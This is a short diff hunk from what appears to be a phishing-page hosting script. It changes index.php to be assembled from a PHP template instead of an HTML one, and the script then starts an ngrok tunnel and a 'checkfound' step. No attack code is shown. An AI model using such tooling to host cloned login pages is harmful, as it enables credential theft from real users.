@@ -270,7 +270,7 @@ exit 1
 fi
 
 cat $website_template > index.php
-cat template.html >> index.php
+cat template.php >> index.php
 ngrok_server
 checkfound
 else
